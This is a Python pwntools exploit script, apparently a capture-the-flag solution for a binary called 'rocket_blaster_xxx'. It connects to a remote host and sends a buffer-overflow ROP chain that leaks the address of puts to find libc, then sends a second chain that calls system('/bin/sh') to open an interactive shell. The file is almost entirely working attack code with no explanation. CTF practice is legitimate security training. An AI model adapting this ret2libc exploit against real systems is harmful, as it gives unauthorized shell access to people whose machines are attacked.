#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("challenge/rocket_blaster_xxx_patched")
libc = ELF("challenge/glibc/libc.so.6")
ld = ELF("challenge/glibc/ld-linux-x86-64.so.2")
context.binary = exe

host = "94.237.59.132"
port = 54654

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp main+0
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

poprdi = 0x000000000040159f #: pop rdi ; ret

padding = b"a"*0x28

payload = flat(
    padding,
    p64(poprdi),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(exe.sym['main'])
)

s(payload)

io.recvuntil(b"testing..\n")

leaked_puts = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leaked_puts - libc.sym['puts']
info(f"leaked puts: {hex(leaked_puts)}")
success(f"libc.address: {hex(libc.address)}")

# -------------------

payload = flat(
    padding,
    p64(poprdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(0x00401588), # ret
    p64(libc.sym['system'])
)

s(payload)

io.interactive()

